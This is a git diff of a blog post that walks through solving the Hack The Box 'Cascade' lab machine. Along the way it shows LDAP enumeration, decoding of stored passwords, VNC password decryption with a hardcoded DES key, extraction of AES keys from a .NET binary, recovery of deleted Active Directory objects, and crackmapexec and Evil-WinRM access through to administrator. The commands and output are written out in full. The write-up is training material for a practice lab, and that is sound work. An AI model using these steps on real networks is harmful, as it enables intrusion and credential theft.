@@ -16,19 +16,29 @@ tags:
 
 {% include toc icon="cog" title="Cascade Solution" %}
 
-The [Cascade](https://app.hackthebox.com/machines/Cascade) machine has been created by [VbScrub](https://app.hackthebox.com/users/158833). This is an medium Windows Machine with a strong focus on Active Directory exploitation, but also a bit of cryptography and reverse engineering. It should be noted that the machine is a bit CTF-y, but still a plausible scenario.
-{: .text-justify}
+The [Cascade](https://app.hackthebox.com/machines/Cascade) machine has been created by [VbScrub](https://app.hackthebox.com/users/158833). This is a **medium** Windows Machine with a strong focus on Active Directory exploitation, but also a bit of cryptography and reverse engineering. It should be noted that the machine is a bit CTF-y.
+
+If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
 
 ![image-center](/images/htb/htb_cascade_infocard.png){: .align-center}
 
 **Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine, except for the Reverse Engineering part. You can download Kali from the official website [here](https://www.kali.org/).
 {: .notice--info}
 
+# Reconnaissance
+
+In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 
+
+This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 
+
+## Scan with Nmap
+
+Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.
 
 ```bash
-$ nmap -sV -Pn 10.129.155.114                                                                   
+$ nmap -sV -Pn 10.129.140.139                                                                   
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 14:45 EST
-Nmap scan report for 10.129.155.114
+Nmap scan report for 10.129.140.139
 Host is up (0.019s latency).
 Not shown: 987 filtered tcp ports (no-response)
 PORT      STATE SERVICE       VERSION
@@ -51,140 +61,87 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 58.95 seconds
 ```
 
-cascade.local
+This computer seems to be a domain controller for **cascade.local**. Let's see if we can extract some users.
+
+## LDAP
+
+First, we can try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) and list usernames. Here, we used the `grep` command to look for the **userPrincipalName** attribute that specifies the UPN of the users.
 
 ```bash
-$ ldapsearch -h 10.129.155.114 -p 389 -x -b "dc=cascade,dc=local"
-# extended LDIF
-#
-# LDAPv3
-# base <dc=cascade,dc=local> with scope subtree
-# filter: (objectclass=*)
-# requesting: ALL
-#
-
-# cascade.local
-dn: DC=cascade,DC=local
-objectClass: top
-objectClass: domain
-objectClass: domainDNS
-distinguishedName: DC=cascade,DC=local
-instanceType: 5
-```
-
-BH
-
-```bash
-$ ./windapsearch.py -d cascade.local --dc-ip 10.129.155.114 -U --full
-[+] No username provided. Will try anonymous bind.
-[+] Using Domain Controller at: 10.129.155.114
-[+] Getting defaultNamingContext from Root DSE
-[+]     Found: DC=cascade,DC=local
-[+] Attempting bind
-[+]     ...success! Binded as: 
-[+]      None
-
-[+] Enumerating all AD users
-[+]     Found 15 users: 
-
-...[snip]...
-
-objectClass: top
-objectClass: person
-objectClass: organizationalPerson
-objectClass: user
-cn: Ryan Thompson
-sn: Thompson
-givenName: Ryan
-distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
-instanceType: 4
-whenCreated: 20200109193126.0Z
-whenChanged: 20200323112031.0Z
-displayName: Ryan Thompson
-uSNCreated: 24610
-memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
-uSNChanged: 295010
-name: Ryan Thompson
-objectGUID: LfpD6qngUkupEy9bFXBBjA==
-userAccountControl: 66048
-badPwdCount: 0
-codePage: 0
-countryCode: 0
-badPasswordTime: 132247339091081169
-lastLogoff: 0
-lastLogon: 132247339125713230
-pwdLastSet: 132230718862636251
-primaryGroupID: 513
-objectSid: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
-accountExpires: 9223372036854775807
-logonCount: 2
-sAMAccountName: r.thompson
-sAMAccountType: 805306368
+$ ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.129.140.139 | grep userPrincipalName
+userPrincipalName: CascGuest@cascade.local
+userPrincipalName: s.smith@cascade.local
 userPrincipalName: r.thompson@cascade.local
-objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
-dSCorePropagationData: 20200126183918.0Z
-dSCorePropagationData: 20200119174753.0Z
-dSCorePropagationData: 20200119174719.0Z
-dSCorePropagationData: 20200119174508.0Z
-dSCorePropagationData: 16010101000000.0Z
-lastLogonTimestamp: 132294360317419816
-msDS-SupportedEncryptionTypes: 0
+userPrincipalName: j.wakefield@cascade.local
+userPrincipalName: s.hickson@cascade.local
+userPrincipalName: j.goodhand@cascade.local
+userPrincipalName: a.turnbull@cascade.local
+userPrincipalName: e.crowe@cascade.local
+userPrincipalName: b.hanson@cascade.local
+userPrincipalName: d.burman@cascade.local
+userPrincipalName: arksvc@cascade.local
+userPrincipalName: util@cascade.local
+userPrincipalName: BackupSvc@cascade.local
+userPrincipalName: j.allen@cascade.local
+userPrincipalName: i.croft@cascade.local
+```
+
+We got some users. Now, for the CTF-y part, we had to take a closer look at `ldapsearch` output and found an attribute named **cascadeLegacyPwd** for the **r.thompson@cascade.local** user.
+
+```bash
+$ ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.129.140.139 | grep -E 'userPrincipalName|cascadeLegacyPwd'
+userPrincipalName: CascGuest@cascade.local
+userPrincipalName: arksvc@cascade.local
+userPrincipalName: s.smith@cascade.local
+userPrincipalName: r.thompson@cascade.local
 cascadeLegacyPwd: clk0bjVldmE=
+userPrincipalName: util@cascade.local
+userPrincipalName: j.wakefield@cascade.local
 
 ...[snip]...
 
 ```
+
+Using the `base64` command, it was possible to decode the value and get a potential password.
 
 ```bash
 $ echo clk0bjVldmE= | base64 -d
 rY4n5eva
 ```
 
+Then, using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec), it was possible to check if the password was valid.
 
 ```bash
-$ crackmapexec smb 10.129.155.114 -d cascade.local -u r.thompson -p rY4n5eva  
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+$ crackmapexec smb 10.129.140.139 -d cascade.local -u r.thompson -p rY4n5eva  
+SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
 ```
 
-$ bloodhound-python -c All -u r.thompson -p rY4n5eva -d cascade.local -ns 10.129.155.114 --zip
-INFO: Found AD domain: cascade.local
-INFO: Connecting to LDAP server: casc-dc1.cascade.local
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: casc-dc1.cascade.local
-INFO: Found 17 users
-INFO: Found 52 groups
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: CASC-DC1.cascade.local
-INFO: Done in 00M 04S
-INFO: Compressing output into 20220210151458_bloodhound.zip
+## Shared Folders
 
-
-![image-center](/images/htb/htb_cascade_bloodhound_rthompson.png){: .align-center}
-
+While **r.thompson** does not have any remote access to the computer, using `crackmapexec` and the `--shares` switch, it was possible to list some shares accessible by **r.thompson** on the target computer.
 
 ```bash
-$ crackmapexec smb 10.129.155.114 -d cascade.local -u r.thompson -p rY4n5eva --shares
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
-SMB         10.129.155.114  445    CASC-DC1         [+] Enumerated shares
-SMB         10.129.155.114  445    CASC-DC1         Share           Permissions     Remark
-SMB         10.129.155.114  445    CASC-DC1         -----           -----------     ------
-SMB         10.129.155.114  445    CASC-DC1         ADMIN$                          Remote Admin
-SMB         10.129.155.114  445    CASC-DC1         Audit$                          
-SMB         10.129.155.114  445    CASC-DC1         C$                              Default share
-SMB         10.129.155.114  445    CASC-DC1         Data            READ            
-SMB         10.129.155.114  445    CASC-DC1         IPC$                            Remote IPC
-SMB         10.129.155.114  445    CASC-DC1         NETLOGON        READ            Logon server share 
-SMB         10.129.155.114  445    CASC-DC1         print$          READ            Printer Drivers
-SMB         10.129.155.114  445    CASC-DC1         SYSVOL          READ            Logon server share 
+$ crackmapexec smb 10.129.140.139 -d cascade.local -u r.thompson -p rY4n5eva --shares
+SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+SMB         10.129.140.139  445    CASC-DC1         [+] Enumerated shares
+SMB         10.129.140.139  445    CASC-DC1         Share           Permissions     Remark
+SMB         10.129.140.139  445    CASC-DC1         -----           -----------     ------
+SMB         10.129.140.139  445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.129.140.139  445    CASC-DC1         Audit$                          
+SMB         10.129.140.139  445    CASC-DC1         C$                              Default share
+SMB         10.129.140.139  445    CASC-DC1         Data            READ            
+SMB         10.129.140.139  445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.129.140.139  445    CASC-DC1         NETLOGON        READ            Logon server share 
+SMB         10.129.140.139  445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.129.140.139  445    CASC-DC1         SYSVOL          READ            Logon server share 
 ```
 
+Here, we can see that **r.thompson** has the **READ** persmission on some folders. 
+
 ```bash
-$ smbclient \\\\10.129.155.114\\Data -U r.thompson
+$ smbclient \\\\10.129.140.139\\Data -U r.thompson
 Enter WORKGROUP\r.thompson's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -199,6 +156,16 @@ smb: \> ls
                 6553343 blocks of size 4096. 1626796 blocks available
 smb: \> 
 ```
+
+By taking a look at the **Data** share, we found multiple folders.
+
+# Initial Access
+
+It's now time to take a look at these folders, it is possible that some of them contain interesting information.
+
+## VNC Password
+
+Let's start by recursively download all the content of **Data** and see if we can find something. Note that we used the `recurse` command to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.
 
 ```bash
 smb: \> recurse
@@ -215,19 +182,23 @@ getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VN
 smb: \> exit
 ```
 
+Done. Let's start by taking a look at *Meeting_Notes_June_2018.html*.
 
+```bash
 $ cat IT/Email\ Archives/Meeting_Notes_June_2018.html
 
 ...[snip]...
 
-<p>-- We will be using a temporary account to
-perform all tasks related to the network migration and this account will be deleted at the end of
-2018 once the migration is complete. This will allow us to identify actions
-related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
+<p>-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
 
 ...[snip]...
+```
 
+Well, it talks about a now-deleted **TempAdmin** account and it seems that this account had the same password as **administrator**, we will get back to that later. Let's keep looking...
 
+We also have a file named *VNC Install.reg* in the **s.smith** directory.
+
+```bash
 $ cat IT/Temp/s.smith/VNC\ Install.reg 
 Windows Registry Editor Version 5.00
 
@@ -258,49 +229,36 @@ Windows Registry Editor Version 5.00
 "UseMirrorDriver"=dword:00000001
 "EnableUrlParams"=dword:00000001
 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+```
 
+This is interesting, it's a backup of registry keys related to VNC. We can also see an encoded password. VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines so we may get a cleartext password by decrypting it.
 
-https://github.com/frizb/PasswordDecrypts
+Using this [post](https://github.com/frizb/PasswordDecrypts) about VNC passwords, we can try to decrypt it. According to the article, decryption the password is as simple as that:
 
+```bash
 $ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
 00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
 00000008
+```
 
-$ crackmapexec smb 10.129.155.114 -d cascade.local -u s.smith -p sT333ve2
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+Cool, we got a cleartext password. As we found this password in **s.smith** folder, let's use this username with `crackmapexec`.
 
+```bash
+$ crackmapexec winrm 10.129.140.139 -d cascade.local -u s.smith -p sT333ve2
+HTTP        10.129.140.139   5985   10.129.140.139    [*] http://10.129.140.139:5985/wsman
+WINRM       10.129.140.139   5985   10.129.140.139    [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
+```
 
-![image-center](/images/htb/htb_cascade_bloodhound_ssmith.png){: .align-center}
+Great, we have valid credentials and a WinRM access.
 
+## WinRM Access
 
-evil-winrm -i 10.129.155.114 -u s.smith -p sT333ve2 
+Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.
 
-
-$ crackmapexec smb 10.129.155.114 -d cascade.local -u s.smith -p sT333ve2 --shares  
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
-SMB         10.129.155.114  445    CASC-DC1         [+] Enumerated shares
-SMB         10.129.155.114  445    CASC-DC1         Share           Permissions     Remark
-SMB         10.129.155.114  445    CASC-DC1         -----           -----------     ------
-SMB         10.129.155.114  445    CASC-DC1         ADMIN$                          Remote Admin
-SMB         10.129.155.114  445    CASC-DC1         Audit$          READ            
-SMB         10.129.155.114  445    CASC-DC1         C$                              Default share
-SMB         10.129.155.114  445    CASC-DC1         Data            READ            
-SMB         10.129.155.114  445    CASC-DC1         IPC$                            Remote IPC
-SMB         10.129.155.114  445    CASC-DC1         NETLOGON        READ            Logon server share 
-SMB         10.129.155.114  445    CASC-DC1         print$          READ            Printer Drivers
-SMB         10.129.155.114  445    CASC-DC1         SYSVOL          READ            Logon server share 
-
-
-$ evil-winrm -i 10.129.155.114 -u s.smith -p sT333ve2 
+```bash
+$ evil-winrm -i 10.129.140.139 -u s.smith -p sT333ve2 
 
 Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
 Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\s.smith\Documents> dir C:\Users\s.smith\Desktop
@@ -313,10 +271,20 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        2/10/2022   7:48 PM             34 user.txt
 -a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
+```
 
+We now have a remote shell access and the **first flag**.
 
+# Privilege Escalation
 
-$ smbclient \\\\10.129.155.114\\Audit$ -U s.smith
+Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.
+
+## Shared Folder Recon
+
+Like the previous user, let's take a look at the shared folders with **s.smith** credentials. Note that this part was again a bit CTF-y as we don't have any clear direction on how to get further on this box.
+
+```bash
+$ smbclient \\\\10.129.140.139\\Audit$ -U s.smith
 Enter WORKGROUP\s.smith's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -332,7 +300,12 @@ smb: \> ls
   x86                                 D        0  Sun Jan 26 17:25:27 2020
 
                 6553343 blocks of size 4096. 1627217 blocks available
- smb: \> cd DB
+```
+
+We found a few DLL/EXE file as well as a **DB** folder. 
+
+```bash
+smb: \> cd DB
 smb: \DB\> dir
   .                                   D        0  Tue Jan 28 16:40:59 2020
   ..                                  D        0  Tue Jan 28 16:40:59 2020
@@ -341,69 +314,78 @@ smb: \DB\> dir
                 6553343 blocks of size 4096. 1627215 blocks available
 smb: \DB\> get Audit.db
 getting file \DB\Audit.db of size 24576 as Audit.db (160.0 KiloBytes/sec) (average 160.0 KiloBytes/sec)
+```
 
+We got our hands on a file named **Audit.db**. Using **SQLite Database Browser** (installed on Kali) we found a **pwd** field related to the **ArkSvc** user.
 
 ![image-center](/images/htb/htb_cascade_sqlite.png){: .align-center}
 
+As it looks like a Base64 encoded value, let's try to decode it.
 
+```bash
 $ echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
 ������D�|zC�;
+```
 
+The value seems to be encrypted, maybe the DLL/EXE we found previously contain some information about how to decrypt it. Let's download them.
+
+```bash
 smb: \DB\> cd ..
 smb: \> get CascAudit.exe
 getting file \CascAudit.exe of size 13312 as CascAudit.exe (104.8 KiloBytes/sec) (average 135.0 KiloBytes/sec)
 smb: \> get CascCrypto.dll
 getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (85.1 KiloBytes/sec) (average 85.1 KiloBytes/sec)
 smb: \> exit
+```
 
-                                                                                                                                                                                
+Now we can dig in the next part of the challenge.
+
+## Reverse Engineering
+
+First, we need to know what kind of executable we have. Using the `file` command, we can see which type of file it is.
+
+```bash                           
 $ file Casc*                     
 CascAudit.exe:  PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
 CascCrypto.dll: PE32 executable (DLL) (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+```
 
+.NET files (32-bit) ! Alright, let's fire up a Windows machine with [dnSpy](https://github.com/dnSpy/dnSpy) installed. **dnSpy** is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available.
 
+After a bit of reverse engineering, we found two (2) interesting methods. The first one, **DecryptString()** seems to be using AES128 as encryption algorithm, we even have the cleartext IV: **1tdyjCbY1Ix49842**.
 
 ![image-center](/images/htb/htb_cascade_dnspy_01.png){: .align-center}
+
+The second one performs an SQL query on the **pwd** field we found previously and decrypt the content with the following key: **c4scadek3y654321**
+
 ![image-center](/images/htb/htb_cascade_dnspy_02.png){: .align-center}
 
-c4scadek3y654321
-1tdyjCbY1Ix49842
-
-
-w3lc0meFr31nd
+With that information, we can try to decrypt the content of the **pwd** field. The easiest way was to use [CyberChef](https://gchq.github.io/CyberChef/) and the **AES Decrypt** module.
 
 ![image-center](/images/htb/htb_cascade_aes_decrypt.png){: .align-center}
 
-$ crackmapexec smb 10.129.155.114 -d cascade.local -u arksvc -p w3lc0meFr31nd
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd
 
+Now, with the recovered value, we can try to login as **arksvc**.
 
-![image-center](/images/htb/htb_cascade_bloodhound_arksvc.png){: .align-center}
+```bash
+$ crackmapexec winrm 10.129.140.139 -d cascade.local -u arksvc -p w3lc0meFr31nd
+HTTP        10.129.140.139   5985   10.129.140.139    [*] http://10.129.140.139:5985/wsman
+WINRM       10.129.140.139   5985   10.129.140.139    [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
+```
 
+The password is valid and we do have a WinRM access to the remote computer.
 
-evil-winrm -i 10.129.155.114 -u arksvc -p w3lc0meFr31nd 
+## Finding the admin password
 
-$ evil-winrm -i 10.129.155.114 -u arksvc -p w3lc0meFr31nd                                                                                                               127 ⨯
+Using `evil-winrm` we can connect to the remote machine and start looking for the deleted **TempAdmin** that the *Meeting_Notes_June_2018.html* file was talking about. 
+
+This task is relatively easy to complete with the [Get-ADObject](https://www.google.com/search?client=safari&rls=en&q=Get-ADObject&ie=UTF-8&oe=UTF-8) cmdlet. By using an LDAP filter and the *-IncludeDeletedObjects* switch, it was possible the find the user.
+
+```bash
+$ evil-winrm -i 10.129.140.139 -u arksvc -p w3lc0meFr31nd
 
 Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
 Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\arksvc\Documents> ls ..\Desktop
-
-
-    Directory: C:\Users\arksvc\Desktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
-
 
 *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
 
@@ -416,14 +398,11 @@ Name              : TempAdmin
                     DEL:f0cc344d-31e0-4866-bceb-a842791ca059
 ObjectClass       : user
 ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+```
 
+Now, let's fine-tune our LDAP filter to get some information about this **TempAdmin** user and recover its properties.
 
-
-*Evil-WinRM* PS C:\Users\arksvc\Documents> 
-
-
-Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
-
+```bash
 *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
 
 
@@ -435,68 +414,41 @@ CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
 cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
 CN                              : TempAdmin
                                   DEL:f0cc344d-31e0-4866-bceb-a842791ca059
-codePage                        : 0
-countryCode                     : 0
-Created                         : 1/27/2020 3:23:08 AM
-createTimeStamp                 : 1/27/2020 3:23:08 AM
-Deleted                         : True
-Description                     :
-DisplayName                     : TempAdmin
-DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
-dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
-givenName                       : TempAdmin
-instanceType                    : 4
-isDeleted                       : True
-LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
-lastLogoff                      : 0
-lastLogon                       : 0
-logonCount                      : 0
-Modified                        : 1/27/2020 3:24:34 AM
-modifyTimeStamp                 : 1/27/2020 3:24:34 AM
-msDS-LastKnownRDN               : TempAdmin
-Name                            : TempAdmin
-                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
-nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
-ObjectCategory                  :
-ObjectClass                     : user
-ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
-objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
-primaryGroupID                  : 513
-ProtectedFromAccidentalDeletion : False
-pwdLastSet                      : 132245689883479503
-sAMAccountName                  : TempAdmin
-sDRightsEffective               : 0
-userAccountControl              : 66048
-userPrincipalName               : TempAdmin@cascade.local
-uSNChanged                      : 237705
-uSNCreated                      : 237695
-whenChanged                     : 1/27/2020 3:24:34 AM
-whenCreated                     : 1/27/2020 3:23:08 AM
+...[snip]...
+```
 
+Once again, we found the **cascadeLegacyPwd** attribute with a Base64 encoded value. Let's decode it.
 
-
+```bash
 $ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
 baCT3r1aN00dles
+```
 
-crackmapexec smb 10.129.155.114 -d cascade.local -u administrator -p baCT3r1aN00dles
+Given the information we previously found, this password should be the same for the **administrator** account.
 
-$ crackmapexec smb 10.129.155.114 -d cascade.local -u administrator -p baCT3r1aN00dles                                         
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
-                                                                                                                                                                                
-┌──(ax㉿nms)-[~]
-└─$ crackmapexec smb 10.129.155.114 -d cascade.local -u administrator -p baCT3r1aN00dles -x "dir C:\Users\Administrator\Desktop" 
-SMB         10.129.155.114  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.155.114  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
-SMB         10.129.155.114  445    CASC-DC1         [+] Executed command 
-SMB         10.129.155.114  445    CASC-DC1         Volume in drive C has no label.
-SMB         10.129.155.114  445    CASC-DC1         Volume Serial Number is CF98-2F06
-SMB         10.129.155.114  445    CASC-DC1         
-SMB         10.129.155.114  445    CASC-DC1         Directory of C:\Users\Administrator\Desktop
-SMB         10.129.155.114  445    CASC-DC1         
-SMB         10.129.155.114  445    CASC-DC1         08/11/2021  15:58    <DIR>          .
-SMB         10.129.155.114  445    CASC-DC1         08/11/2021  15:58    <DIR>          ..
-SMB         10.129.155.114  445    CASC-DC1         10/02/2022  19:48                34 root.txt
-SMB         10.129.155.114  445    CASC-DC1         1 File(s)             34 bytes
-SMB         10.129.155.114  445    CASC-DC1         2 Dir(s)   6,664,507,392 bytes free
-                                                                                             
+```bash
+$ crackmapexec smb 10.129.140.139 -d cascade.local -u administrator -p baCT3r1aN00dles                                         
+SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
+```
+
+Great, we now have credentials (`administrator:baCT3r1aN00dles`) for the **administrator** account. Now we can connect on the remote machine with administrative privileges and read the **second flag**.
+
+```bash
+$ crackmapexec smb 10.129.140.139 -d cascade.local -u administrator -p baCT3r1aN00dles -x "dir C:\Users\Administrator\Desktop" 
+SMB         10.129.140.139  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.129.140.139  445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
+SMB         10.129.140.139  445    CASC-DC1         [+] Executed command 
+SMB         10.129.140.139  445    CASC-DC1         Volume in drive C has no label.
+SMB         10.129.140.139  445    CASC-DC1         Volume Serial Number is CF98-2F06
+SMB         10.129.140.139  445    CASC-DC1         
+SMB         10.129.140.139  445    CASC-DC1         Directory of C:\Users\Administrator\Desktop
+SMB         10.129.140.139  445    CASC-DC1         
+SMB         10.129.140.139  445    CASC-DC1         08/11/2021  15:58    <DIR>          .
+SMB         10.129.140.139  445    CASC-DC1         08/11/2021  15:58    <DIR>          ..
+SMB         10.129.140.139  445    CASC-DC1         10/02/2022  19:48                34 root.txt
+SMB         10.129.140.139  445    CASC-DC1         1 File(s)             34 bytes
+SMB         10.129.140.139  445    CASC-DC1         2 Dir(s)   6,664,507,392 bytes free
+```
+
+Awesome ! I hope you enjoyed it, I know I did :)
